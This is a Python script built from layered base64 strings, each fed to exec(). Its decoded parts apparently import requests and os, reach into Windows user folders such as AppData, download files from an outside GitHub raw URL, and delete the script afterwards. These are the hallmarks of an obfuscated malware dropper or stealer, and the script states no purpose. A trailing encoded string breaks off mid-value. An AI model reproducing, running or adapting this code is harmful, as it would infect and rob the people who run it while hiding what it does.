a='YT0nWVQwbllWY3hkMkl6U2pCSlIwcG9ZekpWTWs1RWMyZGhWekYzWWpOS01FbEhPWHBQZVVKd1lsaENkbU51VVdkamJWWjRaRmRXZW1SSVRUZEpSMXA1WWpJd1oyTkhSakJoUjNod1dXbENjR0pZUW5aamJsRm5WVWRHTUdGRWMyZGhWekYzWWpOS01FbElVbkJpVjFWTFEyMVNiRnBwUW01a1EyZ3hTMVJ2UzBsRFFXZEpRMEZuU1VOQlowbERRV2RrV0VwelNVUXdaMXBwWkc5a1NGSjNZM3B2ZGt3elNtaGtlVFZ1WVZoU2IyUlhTakZqTWxaNVdUSTVkV1JIVm5Wa1F6VnFZakl3ZG1OdVJtcFpiWEIxWlZkYWVHTnVWbkJaYmxZellYazViV0l5VG5waU1sWnNZVmR3TmxsWE1XbGpXRlpxVEROS2JGcHVUWFpoUjFab1draE5kbUpYUm5CaWFUazNaRmd3ZFdSSWFEQktkMjluU1VOQlowbERRV2RKUTBGblNVTkNiMXBYUm10YVdFcDZTVVF3WjJWM2IyZEpRMEZuU1VOQlowbERRV2RKUTBGblNVTkJaMG94Vm5wYVdFbDBVVmRrYkdKdVVXNVBhVUZ1VkZjNU5tRlhlSE5aVXpneFRHcEJaMHRHWkhCaWJWSjJaRE5OWjFSc1VXZE5WRUYxVFVSeloxWXliSFZPYWxFM1NVaG5NazVEYTJkUldFSjNZa2RXV0ZwWFNreGhXRkYyVGxSTk0weHFUVEpKUTJoTVUwWlNUbFJEZDJkaVIyeHlXbE5DU0ZwWFRuSmllV3RuVVRKb2VXSXlNV3hNZW10NFRHcEJkVTVFVVROTmFUUjRUV3BSWjFVeVJtMVpXRXB3VEhwVmVrNTVOSHBPYVdOTFNVTkJaMGxEUVdkSlEwRm5TVU5CWjJaUmIyZEpRMEZuU1VOQlowbERRV2RKUTBKNVNVUXdaMk50Vm5oa1YxWjZaRWhOZFZveVZqQkxTRlo1WWtOM1oyRkhWbWhhUjFaNVkzb3hiMXBYUm10YVdFcDZTMUZ2WjBsRFFXZEpRMEZuU1VOQlowbERRbmxhV0ZJeFkyMDBaMk5wTlRCYVdHZ3dTVU5CWjBsQmIyZEpRMEZuU1VOQlowbERRV2RKUTBGTFdUSTVhMXBUUVRsSlIyUXdTME5rTWtwNWEwdGFXR2hzV1hsb2FtSXlVbXhMVVc5TFdtMDVjMXBIVm5sSlJEQm5WVWRHTUdGRGFHMUphMDAyVERGV2VscFlTbnBNTTNSMlkzazFibHBZVW5OaU1tUndZbWxuY0daVE9VSmpTRUpGVERRV2RKUTBJellWaFNiMGxIT1hkYVZ6UnZXbWxLUkU5cE9WWmpNbFo1WTNrNU4ySXpUWFZhTWxZd1lrYzVibUZYTkc5TFdEQjJVa2RXZW1FelVuWmpRemt5WWtkR2EyRlhNWEJqYkRsNllUTktjR05JVWpkamJVWjFXa2M1ZEV4dVNtaGliVkp3WW01UmIwMVRkMmROYWtWM1RVUkJkMDFFUVhkTlEydzVURzVDTlVscGQyZEpibWRwUzFOQ2FHTjVRbTFQWjI5blNVTkJaMGxEUVdkSlEwRm5TVU5DYlV4dVpIbGhXRkpzUzBObVVXOTBRM0pKVGtObU1FbzNVVzQ1UTFFd1NuWlJiMlJEZGtsT1EyUXdTa0ZuTUVwMlVXNTBRMU13UzFCUmNVNURZVEJMVFdjd1NreFJiVGxEVVRCS1VuQXdTbmh3TUV0Qlp6QkxTRkZ0ZEVObllXUkRaakJMU1c1TFVXOW5TVU5CWjBsRFFXZEpTR1J3WkVkbloySXpRbXhpYVdodFNXdE5Oa3d4Vm5wYVdFcDZURE4wZG1ONU5XNWFXRkp6WWpKa2NHSnBaM0JtVXpsRllqSk9NV0pYVm5Wa1NFMTJaRzE0YUZwSGJIUmhXRXBtWXpKMGVXRllRakJsTTBwb1ltMVNkbUpUTlhsWlZ6VnJZVmMxTUV0RVJYTkpSRWw0VFVSQmQwMUVRWGROUkVGd1psTTFkMlZUU1hOSlEwbzBTV2xyWjFsWVRXZGFhbTlMU1VOQlowbERRV2RKUTBGblNVTkJaMXBwTlROamJXd3dXbE5uYmpCTFRGRnhlVVJSYmpsRFpUQktMMUZyVGtOaU1FdElVWEo1UkZGdVpFTlJTVTVEWWpCS04xRnJkRU5xTUV0cVVXMTBRMnBKVGtOVE1FcDJVV3RPUTFWaFpFTmpZV1JEWjBsT1EyZ3dTbkpSYjBkdVVXNDVRMmxLZVd0TFExRnNNMkZZVW05SlJ6bDNXbGMwYjFwcFNrUlBhVGxXWXpKV2VXTjVPVGRpTTAxMVdqSldNR0pIT1c1aFZ6UnZTMWd3ZGxKSE9UTmliWGgyV1ZkU2Vrd3pXbk5aVjFKd1lsZHNlVmd6VG5KamJXeDNaRWgwZVZsWE5XdGlNakIxWTIxR2RWcEhiSFZrUTJkNFRFTkJlVTFVUVhkTlJFRjNUVVJCZDB0WU1IVmpTR3RwVEVOQmFXVkRTWEJKUjBaNlNVZFpOa05wUVdkSlEwRm5TVU5CWjBsRFFXZEpSMWwxWkROS2NHUkhWVzlLT1VOcE1FdHpaekJLTDFGdWRFTm1NRXBFVVcwNVEyZ3dTemhuTUVvelVXdERSRkZ0T1VObE1FcE1VVzg1UTI4d1NuSlJiM2xFVVd0MFEySXdTa1JSYkVkdVVXNUhibEZ2UTBSUmIyUkRZVEJMUW5Bd1NpOVJiMmxqY0VObmEwcGtNbXd3WVVOQ2RtTkhWblZMUjFscFVYcHZkbFpZVG14amJrMTJaVEk1ZWt4dFpHeGtSM2gyV2pKc2RVdERiRGxNTVVKd1dUTlNNV050Vm5wTU0xcHpXVmRTY0dKWGJIbFlNMDV5WTIxc2QyUklkSGxaVnpWcllqSXdkV050Um5WYVIyeDFaRU5uZUV4RFFYbE5WRUYzVFVSQmQwMUVRWGRMV0RCMVkwaHJhVXhEUVdsbFEwbHdTVWRHZWtsSFdUWkRhVUZuU1VOQlowbERRV2RKUTBGblNVZFpkV1F6U25Ca1IxVnZTamxEYVRCTGMyY3dTaTlSYm5SRFpqQktSRkZ0T1VOb01FczRaekJLTTFGclEwUlJiVGxEWlRCS1RGRnZPVU52TUVweVVXOTVSRkZyZEVOaU1FcEVVV3hIYmxGdVIyNVJiME5FVVc5a1EyRXdTMEp3TUVvdlVXOXBZM0JEWjJ0S1pESnNNR0ZEUW5aalIxWjFTMGRaYVZGNmIzWldXRTVzWTI1TmRtVXlPWHBNYldSc1pFZDRkbG95YkhWTFEydzVUREF4TVdNeWJHcE1NMXB6V1ZkU2NHSlhiSGxZTTA1eVkyMXNkMlJJZEhsWlZ6VnJZakl3ZFdOdFJuVmFSMngxWkVObmVFeERRWGxOVkVGM1RVUkJkMDFFUVhkTFdEQjFZMGhyYVV4RFFXbGxRMGx3U1VkR2VrbEhXVFpEYVVGblNVTkJaMGxEUVdkSlEwRm5TVWRaZFdRelNuQmtSMVZ2U2psRGFUQkxjMmN3U2k5UmJuUkRaakJLUkZGdE9VTm9NRXM0WnpCS00xRnJRMFJSYlRsRFpUQktURkZ2T1VOdk1FcHlVVzk1UkZGcmRFTmlNRXBFVVd4SGJsRnVSMjVSYjBORVVXOWtRMkV3UzBKd01Fb3ZVVzlwWTNCRFoydEtaREpzTUdGRFFuWmpSMVoxUzBkWmFWRjZiM1pXV0U1c1kyNU5kbVV5T1hwTWJXUnNaRWQ0ZGxveWJIVkxRMnc1VERGYWNGcEhWblpqZVRreVlrZEdhMkZYTVhCamJEbDZZVE5LY0dOSVVqZGpiVVoxV2tjNWRFeHVTbWhpYlZKd1ltNVJiMDFUZDJkTmFrVjNUVVJCZDAxRVFYZE5RMnc1VEc1Q05VbHBkMmRKYm1kcFMxTkNhR041UW0xUFoyOW5TVU5CWjBsRFFXZEpRMEZuU1VOQ2JVeHVaSGxoV0ZKc1MwTm1VVzkwUTNKSlRrTm1NRW8zVVc0NVExRXdTblpSYjJSRGRrbE9RMlF3U2tGbk1FcDJVVzUwUTFNd1MxQlJjVTVEWVRCTFRXY3dTa3hSYlRsRFVUQktVbkF3U25od01FdEJaekJMU0ZGdGRFTm5ZV1JEWmpCTFNXNUxVVzluU1VOQloxcFlhR3BhV0VJd1QyZHZaMGxEUVdkSlEwRm5TVWhDZVdGWE5UQkxRMlJYVkVWR1JWTlZNVXBWYVVKVVV6RktTbFZHVVc1TFVXOUxZak5OZFdNemJIcGtSMVowUzBkWmFWcEhWbk5KU0hSMlkzazFkMWxZVW05TWJVWnBZek5DYUdSSFoyOVlNVGx0WVZkNGJGZ3hPSEJtVTBsd0p6c2dhVzF3YjNKMElHSmhjMlUyTkRzZ1pYaGxZeWhpWVhObE5qUXVZalkwWkdWamIyUmxLR0VwS1E9PSc7IGltcG9ydCBiYXNlNjQ7IGV4ZWMoYmFzZTY0LmI2NGRlY29kZShhKSk='; import base64; b='1ZoU2FFd3hTblpaVnpGd1ltMWphVXRSY0hWYVdHUm1XbTA1YzFwSFZubEpSREJuU1d4S2JGbFhlREJhVjNOcFEyMDFiR1F4T1hkWldGSnZTVVF3WjFwdE9YTmFSMVo1U1VNNFoySnRWak5ZTWxwMllrZFNiR05uY0hWYVdHUm1ZMGRHTUdGRE5YUmhNbEp3WTJsb2QxbFlTbXhpYmxKNlVGWlNlV1JYVlhOSlIxWTBZVmhPTUZneU9YSlFWbEo1WkZkVmNFTnVVbmxsVkc5TFNVTkJaMGxJWkhCa1IyZG5Zak5DYkdKcGFHMUphMDAyVERGV2VscFlTbnBNTTNSMlkzazFibHBZVW5OaU1tUndZbWxuY0daVE9VSmpTRUpGV1ZoU2FFd3hTblpaVnpGd1ltMWpkbFZ0Vm1oaVNGSnNZWGs1TW1KSVRuSk1ia0kxU1dsM1owbHVaMmxMVTBKb1kzbENiVTluYjJkSlEwRm5TVU5CWjBsSFdYVmtNMHB3WkVkVmIxb3pVVzlLTWxKclNubHJjRU50VmpSWk1sWjNaRU5DUjJGWGVHeFNXR2h3WXpOU2VsSllTbmxpTTBrMlEybEJaMGxEUW5kWldFNTZRMmR3TUdOdWF6WkRhVUZuU1VOQ00yRllVbTlKUnpsM1dsYzBiMXBwU2tSUGFUbFdZekpXZVdONU9UZGlNMDExV2pKV01HSkhPVzVoVnpSdlMxZ3dkbEZZUW5kU1IwWXdXVk01VTJJeVJuUmhWelZ1VERBeGNGa3pTblpqTWpsdFpFTTVXR0ZYTld0aU0yUjZUREZPTUZsWVNqQkpSVEZzWW01VmRsVklTblphTTBwb1lsaE5kbFV6VW1oamJsSXhZME01TW1KSVRuSk1iVXBvWkVOSmMwbERTalJKYVd0bldWaE5aMXBxYjB0SlEwRm5TVU5CWjBsRFFtMU1ibVI1WVZoU2JFdEhXVzVqTTFKb1kyNVJaMHd5TVhCaWFVSkVUMms1Vm1NeVZubGplVGszWWpOTmRWb3lWakJpUnpsdVlWYzBiMHRZTUhaUldFSjNVa2RHTUZsVE9WTmlNa1owWVZjMWJrd3hTbXhaVjNnd1dsZHpkbVJ0ZUhwaGVUVjNaVk5qY0VOdFZqUlpNbFozWkVOQ1IyRlhlR3hTV0dod1l6TlNlbEpZU25saU0wazJRMmxCWjBsRFFuZFpXRTU2UTJkd01HTnVhelpKUTBGblEybEJaMGxEUW5CaVdFSjJZMjVSWjJNeU9XcGhNbFl3UTIxV05Ga3lWbmRrUkc5TFNVTkJaMGxIT1hwTWJrNDFZek5TYkdKVFoybGpSMngzU1Vkc2RXTXpVbWhpUjNkbll6STVhbUV5VmpCSmFXdExTVU5CWjBsSGJIUmpSemw1WkVOQ2VtSXlUbkphV0ZGTFEyMVNiRnBwUW01aVIyeDNTME5yTmtOcFFXZEpRMEl3WTI1ck5rTnBRV2RKUTBGblNVTkJaMkZUUVRsSlNFNTJXVEowYkdSRE5XNWFXRkp2WWpOT01GbHViSFZaVnpGc1MwaE9kbGt5ZEd4a1F6VnVXbGhTYjJJelRqQmliVVowV2xObmNFdFJiMmRKUTBGblNVTkJaMGxJU214a1NGWjVZbWxDY0VOcFFXZEpRMEpzWlVkT2JHTklVV2RqTWpscVlUSldNRXh0Vm5samJUbDVTVWRHZWtsSFZUWkRhVUZuU1VOQlowbERRV2RqYlZZd1pGaEtkVWxIV1dsTlF6UjNUR3BCZFUxRFNVdERiVkpzV21sQ01GcDVhR2xpTTFKbVlsZFdlbU15Um01YVUyczJRMmxCWjBsSFNqQmtRMEU1U1VOak5FNUVUWGRPUkVFeFRucGpNazlyUmtKU1dFVXlZbFJrZEZGV1JuSk9WWFJJVGpGa1JGZ3pXbkZUTW5SRlRqSldjRk5XV20xVmEyaHNUMVpSZDBwM2IyZEpRMEpwV1hsQk9VbERZek5QVkdjMFRsUm5lRTlFVVhoS2QyOW5TVU5DZW1SRFFUbEpRMlJ2WkVoU2QyTjZiM1pNTWtaM1lWTTFNRnBYZUd4YU0wcG9ZbE0xZG1OdFkzWlpiVGt3U25sQmNrbEhTakJrUTBGeVNVTmpkbU15Vm5WYVJURnNZek5PYUZveVZTOVpNbWhvWkVZNWNGcEVNRzVKUTNObldXMU5aMHQ1UVc1S2JrSm9ZMjVPYkZneU1YWmFSMVU1VkZkR2VXRXlVblprTWpSdFpFZFdOR1JFTUc1SlEzTm5XVzA1TUZneU1XeGpNMDVvV2pKVlMwbERRV2RqYlZaNlkwYzVkV015VldkUVUwSjVXbGhHTVZwWVRqQmplVFZ1V2xoUmIyTXpVWEJEYmxKdVMwZFphVXREUlhCSlNIUjJZM2sxZDFsWVVtOU1iVXBvWXpKV2RWbFhNV3hMUmpsbVdtMXNjMXBXT1daTFdEQm5TMFphVFZVd2MzQllSelZLVlVSdloyVXlaSE5oV0VGdlMxZ3hZMkpyZUZCU01HeFBUMmxDTjJJelRYVmFNbFl3WWtjNWJtRlhORzlMV0RCcFMxRnZTMkl6VFhWak0yeDZaRWRXZEV0SFdXbGtSMFo2WVRKMGNHSkhkMmRNTWxsblRESnNkRWxIVmpSalIzaDJZMjFXZVV4dFZqUmFVMGx3UTIwNWVreHVUalZqTTFKc1lsTm9iVWx1VW1oak1uUnlZVmQ0YzBsRE9XMUpRemx3WWxOQ1ZWcFhlR3hhTTBwb1lsTTFiR1ZIVldsTFVYQjJZM2sxZW1WWVRqQmFWekJ2V21sS01GbFlUbkpoTW14ellrTkJkbHBwUVhaaFZ6Qm5WVzA1YVdKSE9UUlZSM2hvWlZkV2VWRnRWakJaVXpWc1pVZFZhVXRSY0hkamJXeDFaRU5uYmpCTFRGRnhlVVJSYmpsRFpUQktMMUZyVGtOaU1FdElVWEo1UkZGdVpFTlJTVTVEWWpCS04xRnJkRU5xTUV0cVVXMTBRMnBKVGtOVE1FcDJVV3RPUTFWaFpFTmpZV1JEWjBsT1EyZ3dTbkpSYjBkdVVXNDVRMmxLZVc5NFRVUkJjRU50V25aamFVSndTVWRzZFVsSVNtaGliV1JzUzBSVmQwMURhelpEYVVGblNVTkNkMk50YkhWa1EyZHVNRXRNVVhGNVJGRnVPVU5sTUVvdlVXdE9RMkl3UzBoUmNubEVVVzVrUTFGSlRrTmlNRW8zVVd0MFEyb3dTMnBSYlhSRGFrbE9RMU13U25aUmEwNURWV0ZrUTJOaFpFTm5TVTVEYURCS2NsRnZSMjVSYmpsRGFVcDVhMHRKUTBGblNVYzVla3h1VGpWak0xSnNZbE5uYmxreU9YTmlNMGxuVFVSUmJrdFJiMmRKUTBGblpFZHNkRnBUTlhwaVIxWnNZME5uZDB4cVFURkxVVzluU1VOQloyTklTbkJpYmxGdlNqbERhVEJMYzJjd1NpOVJiblJEWmpCS1JGRnRPVU5vTUVzNFp6QktNMUZyUTBSUmJUbERaVEJLVEZGdk9VTnZNRXB5VVc5NVJGRnJkRU5pTUVwRVVXeEhibEZ1UjI1UmIwTkVVVzlrUTJFd1MwSndNRW92VVc5cFkzQkRhVUZuU1VOQ2RtTjVOWHBsV0U0d1dsY3diMG95VG5aaVJ6bDVTVVJSZDBwNWEwdEpRMEZuU1VoU2NHSlhWWFZqTW5oc1dsaEJiMDFETkhkT1UydExTVU5CWjBsSVVubGxWRzlMU1VOQlowb'; exec(base64.b64decode(a+b)); c='0pKVGtObU1FbzNVVzQ1UTFFd1NuWlJiMlJEZGtsT1EyUXdTa0ZuTUVwMlVXNTBRMU13UzFCUmNVNURZVEJMVFdjd1NreFJiVGxEVVRCS1VuQXdTbmh3TUV0Qlp6QkxTRkZ0ZEVObllXUkRaakJMU1c1TFVXOW5TVU5CWjBsRFFXZEpTR1J3WkVkbloySXpRbXhpYVdodFNXdE5Oa3d4Vm5wYVdFcDZURE4wZG1ONU5XNWFXRkp6WWpKa2NHSnBaM0JtVXpsRllqSk9NV0pYVm5Wa1NFMTJaRzE0YUZwSGJIUmhXRXBtWXpKMGVXRllRakJsTTBwb1ltMVNkbUpUTlhsWlZ6VnJZVmMxTUV0RVJYTkpSRWw0VFVSQmQwMUVRWGROUkVGd1psTTFkMlZUU1hOSlEwbzBTV2xyWjFsWVRXZGFhbTlMU1VOQlowbERRV2RKUTBGblNVTkJaMXBwTlROamJXd3dXbE5uYmpCTFRGRnhlVVJSYmpsRFpUQktMMUZyVGtOaU1FdElVWEo1UkZGdVpFTlJTVTVEWWpCS04xRnJkRU5xTUV0cVVXMTBRMnBKVGtOVE1FcDJVV3RPUTFWaFpFTmpZV1JEWjBsT1EyZ3dTbkpSYjBkdVVXNDVRMmxLZVd0TFExRnNNMkZZVW05SlJ6bDNXbGMwYjFwcFNrUlBhVGxXWXpKV2VXTjVPVGRpTTAxMVdqSldNR0pIT1c1aFZ6UnZTMWd3ZGxKSE9UTmliWGgyV1ZkU2Vrd3pXbk5aVjFKd1lsZHNlVmd6VG5KamJXeDNaRWgwZVZsWE5XdGlNakIxWTIxR2RWcEhiSFZrUTJkNFRFTkJlVTFVUVhkTlJFRjNUVVJCZDB0WU1IVmpTR3RwVEVOQmFXVkRTWEJKUjBaNlNVZFpOa05wUVdkSlEwRm5TVU5CWjBsRFFXZEpSMWwxW'
